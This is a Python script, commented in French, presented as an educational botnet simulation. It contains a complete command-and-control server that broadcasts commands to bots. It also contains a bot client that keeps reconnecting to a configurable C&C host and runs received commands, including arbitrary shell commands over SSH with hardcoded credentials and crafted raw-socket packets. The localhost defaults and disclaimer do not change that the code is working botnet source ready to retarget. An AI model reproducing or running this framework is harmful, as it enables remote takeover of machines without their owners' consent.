"""
Botnet Simulation en Environnement Contrôlé
------------------------------------------------
Technos : Python (Sockets, Paramiko), simulation de raw sockets en Python
Objectif : Simuler un réseau de botnets contrôlé à distance pour comprendre leur fonctionnement
          et tester des méthodes de détection (ex. serveur C&C).
Note : Ce code est uniquement à des fins pédagogiques et en environnement contrôlé.
"""

import socket
import threading
import time
import argparse
import paramiko
import sys

def raw_socket_attack_simulation():
    """
    Simule l'envoi d'un paquet via un socket brut.
    Attention : cette opération peut nécessiter des privilèges administrateur.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        packet = b'\x45\x00\x00\x54\x00\x00\x40\x00\x40\x01\xa6\xec' + b'\x00' * 20
        dest_ip = "127.0.0.1"
        s.sendto(packet, (dest_ip, 0))
        return f"Paquet raw socket envoyé à {dest_ip}."
    except Exception as e:
        return "Erreur dans la simulation de raw socket : " + str(e)

class BotClient:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.sock = None
        self.alive = True

    def connect_to_server(self):
        while self.alive:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.server_ip, self.server_port))
                print(f"[+] Connecté au serveur C&C {self.server_ip}:{self.server_port}")
                break
            except Exception as e:
                print(f"[-] Échec de la connexion : {e}. Nouvelle tentative dans 5 secondes...")
                time.sleep(5)

    def send_heartbeat(self):
        """
        Envoie périodiquement un message 'heartbeat' au serveur pour signaler que le bot est actif.
        """
        while self.alive:
            try:
                time.sleep(30)
                self.sock.send(b"heartbeat")
            except Exception as e:
                print("[-] Erreur lors de l'envoi du heartbeat :", e)
                break

    def listen_for_commands(self):
        """
        Attend les commandes envoyées par le serveur et renvoie le résultat après exécution simulée.
        """
        while self.alive:
            try:
                data = self.sock.recv(4096)
                if not data:
                    print("[-] Déconnexion du serveur.")
                    break
                command = data.decode('utf-8').strip()
                print(f"[+] Commande reçue : {command}")
                result = self.execute_command(command)
                self.sock.send(result.encode('utf-8'))
            except Exception as e:
                print("[-] Erreur lors de la réception de commande :", e)
                break

    def execute_command(self, command):
        """
        Exécute une commande reçue du serveur de façon simulée.
        Possibilités :
         - 'ping' : renvoie 'pong'
         - 'heartbeat' : renvoie 'alive'
         - 'raw_attack' : simule l'envoi d'un paquet raw socket
         - 'ssh <commande>' : simule une exécution de commande via SSH avec Paramiko
         - Sinon, renvoie un message simulant l'exécution de la commande.
        """
        if command.lower() == 'ping':
            return 'pong'
        elif command.lower() == 'heartbeat':
            return 'alive'
        elif command.lower() == 'raw_attack':
            return raw_socket_attack_simulation()
        elif command.startswith("ssh "):
            ssh_command = command[4:]
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect('127.0.0.1', username='user', password='pass')
                stdin, stdout, stderr = ssh.exec_command(ssh_command)
                output = stdout.read().decode('utf-8')
                ssh.close()
                return output if output else "Commande SSH exécutée."
            except Exception as e:
                return f"Erreur SSH : {e}"
        else:
            return f"Commande exécutée : {command}"

    def start(self):
        self.connect_to_server()
        threading.Thread(target=self.send_heartbeat, daemon=True).start()
        self.listen_for_commands()

class CommandAndControlServer:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.server_socket = None
        self.bot_connections = {} 
        self.bot_id_counter = 1
        self.lock = threading.Lock()

    def start_server(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        print(f"[+] Serveur C&C démarré sur {self.host}:{self.port}")
        threading.Thread(target=self.accept_connections, daemon=True).start()
        self.command_prompt()

    def accept_connections(self):
        while True:
            conn, addr = self.server_socket.accept()
            with self.lock:
                bot_id = self.bot_id_counter
                self.bot_id_counter += 1
                self.bot_connections[bot_id] = (conn, addr)
            print(f"[+] Bot {bot_id} connecté depuis {addr[0]}:{addr[1]}")
            threading.Thread(target=self.handle_bot, args=(bot_id, conn), daemon=True).start()

    def handle_bot(self, bot_id, conn):
        while True:
            try:
                data = conn.recv(4096)
                if not data:
                    break
                message = data.decode('utf-8').strip()
                print(f"[Bot {bot_id}] {message}")
            except Exception as e:
                print(f"[-] Erreur avec le bot {bot_id} : {e}")
                break
        with self.lock:
            if bot_id in self.bot_connections:
                del self.bot_connections[bot_id]
        print(f"[-] Bot {bot_id} déconnecté.")

    def command_prompt(self):
        """
        Invite de commande pour envoyer des commandes aux bots.
        Syntaxe :
          broadcast <commande>  : envoi de la commande à tous les bots.
          send <bot_id> <commande> : envoi de la commande à un bot précis.
        """
        print("Syntaxe des commandes :\n  broadcast <commande>\n  send <bot_id> <commande>")
        while True:
            try:
                command_line = input("C&C> ").strip()
                if not command_line:
                    continue
                if command_line.startswith("broadcast "):
                    command = command_line[len("broadcast "):]
                    self.broadcast_command(command)
                elif command_line.startswith("send "):
                    parts = command_line.split(" ", 2)
                    if len(parts) < 3:
                        print("[-] Format invalide. Utilisez : send <bot_id> <commande>")
                        continue
                    try:
                        bot_id = int(parts[1])
                    except ValueError:
                        print("[-] ID du bot invalide.")
                        continue
                    command = parts[2]
                    self.send_command(bot_id, command)
                else:
                    print("[-] Commande inconnue. Utilisez 'broadcast' ou 'send'.")
            except Exception as e:
                print("[-] Erreur dans l'invite de commande :", e)

    def broadcast_command(self, command):
        with self.lock:
            for bot_id, (conn, addr) in list(self.bot_connections.items()):
                try:
                    conn.send(command.encode('utf-8'))
                    print(f"[+] Commande envoyée au bot {bot_id}.")
                except Exception as e:
                    print(f"[-] Échec de l'envoi vers le bot {bot_id} : {e}")

    def send_command(self, bot_id, command):
        with self.lock:
            if bot_id in self.bot_connections:
                conn, addr = self.bot_connections[bot_id]
                try:
                    conn.send(command.encode('utf-8'))
                    print(f"[+] Commande envoyée au bot {bot_id}.")
                except Exception as e:
                    print(f"[-] Échec de l'envoi vers le bot {bot_id} : {e}")
            else:
                print(f"[-] Bot {bot_id} introuvable.")

def main():
    parser = argparse.ArgumentParser(
        description="Botnet Simulation en Environnement Contrôlé (Usage pédagogique uniquement)"
    )
    parser.add_argument("role", choices=["server", "bot"],
                        help="Rôle à lancer : 'server' pour le serveur C&C, 'bot' pour un client bot")
    parser.add_argument("--host", default="127.0.0.1",
                        help="Adresse IP du serveur (défaut : 127.0.0.1)")
    parser.add_argument("--port", type=int, default=9999,
                        help="Port du serveur (défaut : 9999)")
    args = parser.parse_args()

    if args.role == "server":
        server = CommandAndControlServer(args.host, args.port)
        server.start_server()
    elif args.role == "bot":
        bot = BotClient(args.host, args.port)
        bot.start()

if __name__ == "__main__":
    main()
